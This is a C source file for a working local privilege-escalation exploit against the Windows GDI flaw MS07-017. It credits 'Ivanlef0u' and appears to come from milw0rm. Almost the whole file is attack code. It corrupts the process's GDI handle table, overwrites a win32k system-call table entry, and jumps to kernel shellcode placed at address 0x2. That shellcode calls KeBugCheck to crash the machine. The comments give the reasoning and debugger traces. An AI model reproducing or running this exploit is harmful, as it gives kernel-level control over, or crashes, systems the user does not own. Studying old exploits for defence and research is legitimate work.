#define _WIN32_WINNT 0x0500
#include <windows.h>
#include <shlwapi.h>
#include <stdio.h>

#pragma comment (lib, "user32.lib")
#pragma comment (lib, "gdi32.lib")
#pragma comment (lib, "shlwapi.lib")
#pragma comment (lib, "ntdll.lib")



/*
Here is a sploit for the GDI MS07-017 Local Privilege Escalation, presented during the last blackhat conferences
by Joel Ericksson. Modify the GdiTable of the current process and by calling good API's changean entry of the 
win32k's SSDT by 0x2. 

before :
lkd> dps bf998300 L 2
bf998300  bf934921 win32k!NtGdiAbortDoc
bf998304  bf94648d win32k!NtGdiAbortPath

after :
lkd> dps bf998300 L 2
bf998300  00000002
bf998304  bf94648d win32k!NtGdiAbortPath

win32k.sys bDeleteBrush (called by DeleteObject)
mov     esi, [edx] ;esi=pKernelInfo
cmp     [esi+4], ebx ; ebx=0, we need [esi+4]>0
mov     eax, [edx+0Ch]
mov     [ebp+var_8], eax
ja      short loc_BF80C1E7 ;jump if [esi+4] > 0

loc_BF80C1E7:
mov     eax, [esi+24h]  ; [esi+24] = addr to hijack (here win32k SSDT)
mov     dword ptr [eax], 2 ; !!!!!

At 0x2 we allocate memory with NtAllocateVirtualMemory and we copy our payload.

Tested on windows xp sp2 french last updates (before MS07-017) 

Coded by Ivanlef0u. 
http://ivanlef0u.free.fr

ref:
http://www.microsoft.com/technet/security/bulletin/MS07-017.mspx
http://research.eeye.com/html/alerts/zeroday/20061106.html
http://projects.info-pull.com/mokb/MOKB-06-11-2006.html
https://www.blackhat.com/presentations/bh-eu-07/Eriksson-Janmar/Whitepaper/bh-eu-07-eriksson-WP.pdf
http://www.securityfocus.com/bid/20940/info
*/

typedef struct
{
   DWORD pKernelInfo;
   WORD  ProcessID; 
   WORD  _nCount;
   WORD  nUpper;
   WORD  nType;
   DWORD pUserInfo;
} GDITableEntry;

typedef enum _SECTION_INFORMATION_CLASS {
SectionBasicInformation,
SectionImageInformation
}SECTION_INFORMATION_CLASS; 

typedef struct _SECTION_BASIC_INFORMATION { // Information Class 0
PVOID BaseAddress;
ULONG Attributes;
LARGE_INTEGER Size;
}SECTION_BASIC_INFORMATION, *PSECTION_BASIC_INFORMATION;

extern "C" ULONG __stdcall NtQuerySection(
	IN HANDLE SectionHandle,
	IN SECTION_INFORMATION_CLASS SectionInformationClass,
	OUT PVOID SectionInformation,
	IN ULONG SectionInformationLength,
	OUT PULONG ResultLength OPTIONAL
);

extern "C" ULONG __stdcall NtAllocateVirtualMemory(
	IN HANDLE ProcessHandle,
	IN OUT PVOID *BaseAddress,
	IN ULONG ZeroBits,
	IN OUT PULONG AllocationSize,
	IN ULONG AllocationType,
	IN ULONG Protect
);

typedef LONG NTSTATUS;

#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L) 
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L) 

typedef struct _UNICODE_STRING {
USHORT Length;
USHORT MaximumLength;
PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef enum _SYSTEM_INFORMATION_CLASS {
SystemModuleInformation=11,
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_MODULE_INFORMATION { // Information Class 11
ULONG Reserved[2];
PVOID Base;
ULONG Size;
ULONG Flags;
USHORT Index;
USHORT Unknown;
USHORT LoadCount;
USHORT ModuleNameOffset;
CHAR ImageName[256];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION; 

extern "C" NTSTATUS __stdcall  NtQuerySystemInformation(          
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	IN OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength OPTIONAL
);

extern "C" ULONG __stdcall RtlNtStatusToDosError(
  NTSTATUS Status
);


// generic kernel payload, reboot the b0x
unsigned char Shellcode[]={ 
0x60, //PUSHAD
0x55, //PUSH EBP

0x6A, 0x34,
0x5B,
0x64, 0x8B, 0x1B,
0x8B, 0x6B, 0x10,

0x8B, 0x45, 0x3C,
0x8B, 0x54, 0x05, 0x78,
0x03, 0xD5,
0x8B, 0x5A, 0x20,
0x03, 0xDD,
0x8B, 0x4A, 0x18,
0x49,
0x8B, 0x34, 0x8B,
0x03, 0xF5,
0x33, 0xFF,
0x33, 0xC0,
0xFC,
0xAC,
0x84, 0xC0,
0x74, 0x07,
0xC1, 0xCF, 0x0D,
0x03, 0xF8,
0xEB, 0xF4,
0x81, 0xFF, 0x1f, 0xaa ,0xf2 ,0xb9, //0xb9f2aa1f, KEBugCheck
0x75, 0xE1,
0x8B, 0x42, 0x24,
0x03, 0xC5,
0x66, 0x8B, 0x0C, 0x48,
0x8B, 0x42, 0x1C,
0x03, 0xC5,
0x8B, 0x04 ,0x88,
0x03, 0xC5,

0x33, 0xDB,
0xB3, 0xE5,
0x53,
0xFF, 0xD0,

0x5D, //POP EBP
0x61, //POPAD
0xC3 //RET
};	


ULONG GetWin32kBase()
{
	ULONG i, Count, Status, BytesRet;
	PSYSTEM_MODULE_INFORMATION pSMI;
	
	Status=NtQuerySystemInformation(SystemModuleInformation, pSMI, 0, &BytesRet); //allocation length
	if(Status!=STATUS_INFO_LENGTH_MISMATCH)
		printf("Error with NtQuerySystemInformation : 0x%x : %d \n", Status, RtlNtStatusToDosError(Status));
	
	pSMI=(PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BytesRet);
	
	Status=NtQuerySystemInformation(SystemModuleInformation, pSMI, BytesRet, &BytesRet);
	
	if(Status!=STATUS_SUCCESS)
		printf("Error with NtQuerySystemInformation : 0x%x : %d \n", Status, RtlNtStatusToDosError(Status));
	
	/*
	The data returned to the SystemInformation buffer is a ULONG count of the number of
	handles followed immediately by an array of 
	SYSTEM_MODULE_INFORMATION.
	*/
	
	Count=*(PULONG)pSMI;
	pSMI=(PSYSTEM_MODULE_INFORMATION)((PUCHAR)pSMI+4);
	
	for(i=0; i<Count; i++)
	{	
		if(StrStr((pSMI+i)->ImageName, "win32k.sys"))
			return (ULONG)(pSMI+i)->Base;
	}
	
	HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, pSMI);
	
	return 0;	
}	



	
ULONG buff[500]={0};
	
int main(int argc, char* argv[])
{
	ULONG i, PID, Status, Old;
	LPVOID lpMapAddress=NULL;
	HANDLE hMapFile=(HANDLE)0x10;
	GDITableEntry *gdiTable; 
	SECTION_BASIC_INFORMATION SBI;
	WORD Upr;
	ULONG Size=0x1000;
	PVOID Addr=(PVOID)0x2;
	
	printf("Windows GDI MS07-017 Local Privilege Escalation Exploit\nBy Ivanlef0u\n"
	"http://ivanlef0u.free.fr\n"
	"Be MAD!\n");
	
	//allocate memory at addresse 0x2
 	Status=NtAllocateVirtualMemory((HANDLE)-1, &Addr, 0, &Size, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE); 
 	if(Status)
 		printf("Error with NtAllocateVirtualMemory : 0x%x\n", Status);
 	else
 		printf("Addr : 0x%x OKAY\n", Addr);	
	
	memcpy(Addr, Shellcode, sizeof(Shellcode)); 
	


 	printf("win32.sys base : 0x%x\n", GetWin32kBase());
	
	ULONG Win32kSST=GetWin32kBase()+0x198300; //range between win32k imagebase and it's SSDT
	printf("SSDT entry : 0x%x\n", Win32kSST); //win32k!NtGdiAbortDoc
	
	
	
	HBRUSH hBr;
	hBr=CreateSolidBrush(0);

	Upr=(WORD)((DWORD)hBr>>16);
	printf("0x%x\n", Upr);

	while(!lpMapAddress)
	{
		hMapFile=(HANDLE)((ULONG)hMapFile+1);
		lpMapAddress=MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, 0);
	}

	if(lpMapAddress==NULL)
	{ 
		printf("Error with MapViewOfFile : %d\n", GetLastError()); 
		return 0;
	}

	Status=NtQuerySection(hMapFile, SectionBasicInformation, &SBI, sizeof(SECTION_BASIC_INFORMATION), 0);
	if (Status) //!=STATUS_SUCCESS (0)
	{
		printf("Error with NtQuerySection (SectionBasicInformation) : 0x%x\n", Status); 
		return 0;
	}

	printf("Handle value : %x\nMapped address : 0x%x\nSection size : 0x%x\n\n", hMapFile, lpMapAddress, SBI.Size.QuadPart);
	gdiTable=(GDITableEntry *)lpMapAddress;
	PID=GetCurrentProcessId();
	
	for (i=0; i<SBI.Size.QuadPart; i+=sizeof(GDITableEntry))
	{
		if(gdiTable->ProcessID==PID && gdiTable->nUpper==Upr) //only our GdiTable and brush
		{	

			printf("gdiTable : 0x%x\n", gdiTable);
			printf("pKernelInfo : 0x%x\n", gdiTable->pKernelInfo);
			printf("ProcessID : %d\n", gdiTable->ProcessID);
			printf("_nCount : %d\n", gdiTable->_nCount);
			printf("nUpper : 0x%x\n", gdiTable->nUpper);
			printf("nType : 0x%x\n", gdiTable->nType );
			printf("pUserInfo : 0x%x\n\n", gdiTable->pUserInfo);
			
			Old=gdiTable->pKernelInfo;
		
			gdiTable->pKernelInfo=(ULONG)buff; //crafted buff
			break;
		}
		gdiTable++;
	}

	if(!DeleteObject(hBr))
		printf("Error with DeleteObject : %d\n", GetLastError());
	else
		printf("Done\n");

	printf("Buff : 0x%x\n", buff);
	memset(buff, 0x90, sizeof(buff));
	
 	buff[0]=0x1; //!=0
 	buff[0x24/4]=Win32kSST; //syscall to modifY
	buff[0x4C/4]=0x804D7000; //kernel base, just for avoiding bad mem ptr

 	if(!DeleteObject(hBr))
		printf("Error with DeleteObject : %d\n", GetLastError());	
		
	gdiTable->pKernelInfo=Old; //restore old value
	
	/*	
	lkd> uf GDI32!NtGdiAbortDoc
	GDI32!NtGdiAbortDoc:
	77f3073a b800100000      mov     eax,1000h
	77f3073f ba0003fe7f      mov     edx,offset SharedUserData!SystemCallStub (7ffe0300)
	77f30744 ff12            call    dword ptr [edx]
	77f30746 c20400          ret     4
	*/

	__asm
	{
		mov eax, 0x1000
		mov edx,0x7ffe0300
		call dword ptr [edx]	
	}
	
	return 0;
}

// milw0rm.com [2007-04-08]
